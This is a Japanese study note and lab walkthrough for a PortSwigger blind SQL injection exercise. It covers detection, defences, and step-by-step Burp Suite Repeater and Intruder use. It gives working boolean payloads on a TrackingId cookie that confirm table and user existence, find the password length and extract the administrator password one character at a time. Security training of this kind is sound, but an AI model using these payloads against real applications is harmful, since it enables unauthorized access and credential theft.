## Lab: Blind SQL injection with conditional responses PRACTITIONER

---

## 🔍 これはどんな脆弱性か（本質）
**アプリが SQL の結果を直接返さないのに、  
“挙動の違い” からデータベース内部の情報を推測できてしまう脆弱性。**

- エラーメッセージなし  
- レスポンス内容も変わらない  
- でも **True/False の条件分岐** がレスポンスの微妙な違いとして現れる  
  → それを利用して **1ビットずつ情報を抜く**

例：  
`AND 1=1` → Welcome back  
`AND 1=0` → Welcome back が消える  
→ 条件が評価されている＝SQL が実行されている証拠

---

## 🧭 どう気づくか（検出ポイント）
1. **Cookie やパラメータにシングルクォートを入れる**  
   → エラーは出ないが挙動が変わる  
2. **True/False 条件を入れて反応を見る**  
   - `' AND 1=1--` → Welcome back  
   - `' AND 1=0--` → Welcome back 消える  
3. **レスポンスの差分が “条件分岐の結果” と一致する**  
   → ブラインドSQLi確定

---

## 🎯 どう攻撃するか（攻撃フロー）
攻撃は **条件分岐を利用した情報抽出**。

### 1. 存在確認
```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

### 2. 特定ユーザー確認
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

### 3. パスワード長を特定
```sql
' AND LENGTH(password) > 10--
```
True/False の変化で長さを二分探索 or 総当たり。

### 4. 1文字ずつ抽出
```sql
' AND SUBSTRING(password,1,1)='a'--
```
- Welcome back → 正解  
- Welcome back 消える → 不正解  
これを 1〜20文字まで繰り返す。

Burp Intruder の Cluster Bomb で自動化可能。

---

## 🛡️ どう対策するか（実務レベル）
**SQLi 対策の王道を全部やる。**

### 1. **プリペアドステートメント（パラメータ化クエリ）**
- 文字列連結を禁止  
- SQL 文とデータを完全に分離  
→ これだけでほぼ全ての SQLi が消える

### 2. **ORM / Query Builder の利用**
- 生SQLを極力書かない

### 3. **エラーメッセージを返さない**
- ただし Blind SQLi はエラー非表示でも成立する  
→ これだけでは不十分

### 4. **レスポンスの挙動を統一**
- ログイン成功/失敗でレスポンス時間やメッセージを変えない  
- Blind SQLi の “挙動差分” を消す

### 5. **WAF / レート制限**
- 大量リクエストをブロック  
- Burp Intruder のような攻撃を遅延させる

---

## 🧩まとめ

> **「Blind SQL Injection は、アプリが SQL の結果を直接返さないのに、  
> True/False の挙動差からデータを推測できてしまう脆弱性です。  
> パラメータに `' AND 1=1--` と `' AND 1=0--` を入れて挙動が変われば気づけます。  
> 攻撃者はこの差分を利用して、パスワード長や各文字を1文字ずつ抽出します。  
> 対策はプリペアドステートメントの徹底、レスポンスの統一、  
> レート制限やWAFの導入です。」**

---

# 🔥 Blind SQL Injection（条件分岐型）  
**超詳細ステップバイステップガイド

---

## ## ステップ1: Burp Suiteの準備

1. Burp Suite Community Editionを起動  
2. 「Temporary project」→「Next」  
3. 「Use Burp defaults」→「Start Burp」  
4. 上部メニュー「Proxy」→「Intercept」  
5. 「Intercept is on」になっていることを確認（オレンジ）

---

## ## ステップ2: ブラウザでBurpのプロキシ設定

- Burp付属ブラウザ → 「Open browser」  
- 自分のブラウザ → プロキシを `127.0.0.1:8080` に設定

---

## ## ステップ3: ラボにアクセス

1. ラボURLを開く  
2. Burp に戻り、Intercept でリクエストを Forward  
3. ページが完全に読み込まれるまで Forward を押す

---

## ## ステップ4: My accountクリック

1. ブラウザで「My account」クリック  
2. Burpで Forward  
3. ログインページが表示される  
4. 右上に **Welcome back!** が出ているか確認（重要）

---

## ## ステップ5: TrackingIdを見つける

1. Burp → Proxy → HTTP history  
2. `/login` の GET リクエストをクリック  
3. Request 内の `Cookie:` 行を確認  
   ```
   Cookie: TrackingId=abc123xyz456def
   ```

---

## ## ステップ6: Repeaterに送る

- `/login` リクエストを右クリック → **Send to Repeater**

---

## ## ステップ7: インジェクション確認（True）

TrackingId の末尾に追加：

```
' AND 1=1--
```

- Send → Response → Render  
- **Welcome back! が表示されれば True**

---

## ## ステップ8: インジェクション確認（False）

```
' AND 1=0--
```

- Send  
- **Welcome back! が消えれば False**

→ Blind SQLi 確定

---

## ## ステップ9: usersテーブルの存在確認

```
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

- Welcome back → users テーブル存在

---

## ## ステップ10: administratorユーザー確認

```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

- Welcome back → administrator 存在

---

## ## ステップ11: Intruderへ送る（パスワード長特定）

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
```

- 右クリック → Send to Intruder

---

## ## ステップ12: Intruder設定（パスワード長）

### Positions
- Clear §  
- `>1` の **1** を選択 → Add §  
- `>§1§` になる

### Payloads
- Payload type: **Numbers**  
- From: 1  
- To: 30  
- Step: 1  

→ Start attack

---

## ## ステップ13: パスワード長の確認

- Attack ウィンドウで Length 列をソート  
- 1つだけ短いレスポンスがある  
  → その Payload がパスワード長  
  → 例：20

---

## ## ステップ14: IntruderでPassword抽出準備

Repeaterで以下に変更：

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

→ Send to Intruder

---

## ## ステップ15: Cluster Bomb設定（Positions）

1. Attack type → **Cluster bomb**  
2. Clear §  
3. `SUBSTRING(password,1,1)` の **1** を選択 → Add §  
4. `'a'` の **a** を選択 → Add §  

最終形：

```
Cookie: TrackingId=abc123xyz456def' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```

---

## ## ステップ16: Payload 1（文字位置）

- Payload set: 1  
- Payload type: Numbers  
- From: 1  
- To: 20  
- Step: 1  

---

## ## ステップ17: Payload 2（文字候補）

- Payload set: 2  
- Payload type: Brute forcer  
- Character set: `abcdefghijklmnopqrstuvwxyz0123456789`  
- Min length: 1  
- Max length: 1  

---

## ## ステップ18: Grep-Match設定

- Settings → Grep - Match  
- Clear  
- `Welcome back` を追加  
- チェックを入れる

---

## ## ステップ19: Attack開始

- Start attack  
- 720リクエスト  
- Community Editionだと約2時間

---

## ## ステップ20: パスワード抽出

1. Attackウィンドウで Payload 1 をソート  
2. Welcome back に ✓ がついている行を探す  
3.  
   - Payload 1 → 文字位置  
   - Payload 2 → その文字  

例：

| Payload1 | Payload2 | 意味 |
|---------|----------|------|
| 1 | a | 1文字目 a |
| 2 | b | 2文字目 b |
| … | … | … |
| 20 | z | 20文字目 z |

→ 20文字のパスワード完成

---

## ## ステップ21: ログイン

- Username: `administrator`  
- Password: 抽出した20文字  
- Log in  
- **Congratulations, you solved the lab!**

---

# ✅ まとめチェックリスト

- [ ] Burp起動してProxy設定  
- [ ] ラボアクセス → My account → Welcome back確認  
- [ ] /login を Repeater に送る  
- [ ] `' AND 1=1--` で True  
- [ ] `' AND 1=0--` で False  
- [ ] users テーブル確認  
- [ ] administrator 確認  
- [ ] Sniper でパスワード長特定（20文字）  
- [ ] Cluster Bomb で1文字ずつ抽出  
- [ ] administrator でログイン  
- [ ] Lab 完了 🎉

---


